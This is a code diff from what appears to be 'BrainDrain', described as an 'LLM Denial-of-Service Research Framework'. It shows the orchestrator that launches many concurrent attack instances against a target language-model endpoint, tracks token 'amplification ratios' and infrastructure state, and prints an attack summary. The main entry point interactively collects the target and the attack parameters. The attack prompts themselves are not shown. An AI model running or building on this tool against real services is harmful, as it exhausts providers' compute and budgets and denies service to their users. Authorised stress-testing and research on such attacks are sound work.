+        for i in range(self.n_instances):
+            self._instances.append(self._make_instance(i))
+
+        # Step 3 — launch tasks
+        for inst in self._instances:
+            task = asyncio.create_task(inst.run_loop(self._queue, self._stop))
+            self._tasks.append(task)
+
+        collect_task    = asyncio.create_task(self._collect())
+        probe_task      = asyncio.create_task(self._probe_monitor())
+        budget_task     = asyncio.create_task(self._budget_watcher())
+        watchdog_task   = asyncio.create_task(self._instance_watchdog())
+        recovery_task   = asyncio.create_task(self._error_watcher())
+
+        try:
+            if _RICH:
+                self._live = Live(
+                    self._display.render(), refresh_per_second=2, console=console
+                )
+                self._live.start()
+                self._refresh_task = asyncio.create_task(self._refresh_display())
+                await self._stop.wait()
+            else:
+                self._refresh_task = asyncio.create_task(self._refresh_display())
+                await self._stop.wait()
+
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            _print(
+                "\n\n  [bold yellow]Interrupted by user.[/bold yellow]"
+                if _RICH else
+                "\n\n  Interrupted by user."
+            )
+            self._stop.set()
+
+        finally:
+            if self._refresh_task and not self._refresh_task.done():
+                self._refresh_task.cancel()
+            if _RICH and self._live:
+                self._live.stop()
+
+            # Cancel instance loops
+            for task in self._tasks:
+                task.cancel()
+            budget_task.cancel()
+            watchdog_task.cancel()
+            probe_task.cancel()
+            recovery_task.cancel()
+
+            # Drain remaining results
+            await asyncio.gather(*self._tasks, return_exceptions=True)
+            await collect_task
+
+            if self._probes:
+                await self._probes.close()
+
+            # Final summary
+            run_result = self._collector.finalise(
+                instance_stats=[inst.stats for inst in self._instances]
+            )
+            self._print_summary(run_result)
+
+    def _print_summary(self, result: Any) -> None:
+        _print(
+            "\n[bold cyan]── Attack Summary ──[/bold cyan]" if _RICH
+            else "\n── Attack Summary ──"
+        )
+        if _RICH:
+            t = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan")
+            t.add_column("Metric", style="dim")
+            t.add_column("Value", justify="right")
+            t.add_row("Wall clock",        f"{result.wall_clock_s:.1f}s")
+            t.add_row("Total requests",    str(result.total_requests))
+            t.add_row("Successful",        str(result.successful))
+            t.add_row("Timed out",         str(result.timed_out))
+            t.add_row("Failed",            str(result.failed))
+            t.add_row("Mean amp ratio",    f"{result.mean_amplification_ratio:.1f}×")
+            t.add_row("P95 amp ratio",     f"{result.p95_amplification_ratio:.1f}×")
+            t.add_row("Output tokens",      f"{result.total_generated_tokens:,}")
+            t.add_row("Input tokens",       f"{result.total_prompt_tokens:,}")
+            t.add_row("Total tokens",       f"{result.total_generated_tokens + result.total_prompt_tokens:,}")
+            t.add_row("Tokens/s",           f"{result.tokens_generated_per_second:.0f}")
+            t.add_row("Mean TTFT",         f"{result.mean_ttft_s:.2f}s")
+            t.add_row("Mean duration",     f"{result.mean_total_duration_s:.1f}s")
+            console.print(t)
+
+            if result.state_timeline:
+                _print("\n[bold]Infra state timeline:[/bold]")
+                for offset, state in result.state_timeline:
+                    _print(f"  +{offset:6.1f}s  {state}")
+        else:
+            print(result.summary())
+
+
+# ─────────────────────────────────────────────
+# Main entry point
+# ─────────────────────────────────────────────
+
+_BANNER = r"""
+ ███████████                       ███             ██████████                        ███
+▒▒███▒▒▒▒▒███                     ▒▒▒             ▒▒███▒▒▒▒███                      ▒▒▒
+ ▒███    ▒███ ████████   ██████   ████  ████████   ▒███   ▒▒███ ████████   ██████   ████  ████████
+ ▒██████████ ▒▒███▒▒███ ▒▒▒▒▒███ ▒▒███ ▒▒███▒▒███  ▒███    ▒███▒▒███▒▒███ ▒▒▒▒▒███ ▒▒███ ▒▒███▒▒███
+ ▒███▒▒▒▒▒███ ▒███ ▒▒▒   ███████  ▒███  ▒███ ▒███  ▒███    ▒███ ▒███ ▒▒▒   ███████  ▒███  ▒███ ▒███
+ ▒███    ▒███ ▒███      ███▒▒███  ▒███  ▒███ ▒███  ▒███    ███  ▒███      ███▒▒███  ▒███  ▒███ ▒███
+ ███████████  █████    ▒▒████████ █████ ████ █████ ██████████   █████    ▒▒████████ █████ ████ █████
+▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒      ▒▒▒▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒      ▒▒▒▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒ ▒▒▒▒▒
+"""
+
+
+def main() -> None:
+    _setup_logging()
+
+    if _RICH:
+        console.print(_BANNER, style="bold cyan", highlight=False)
+        console.print(
+            "       LLM Denial-of-Service Research Framework\n",
+            style="dim",
+            justify="center",
+        )
+    else:
+        print(_BANNER)
+        print("       LLM Denial-of-Service Research Framework\n")
+
+    # Gather config interactively
+    target  = gather_target_config()
+    params  = gather_attack_params(target)
+
+    orchestrator = AttackOrchestrator(
+        target=target,
+        attack_type=params["attack_type"],
+        n_instances=params["n_instances"],
+        max_tokens=params["max_tokens"],
+        token_budget=params["token_budget"],
+        attack_extra=params["extra"],
+    )
+
+    try:
+        asyncio.run(orchestrator.run())
+    except KeyboardInterrupt:
+        pass
+
+
+if __name__ == "__main__":
+    main()
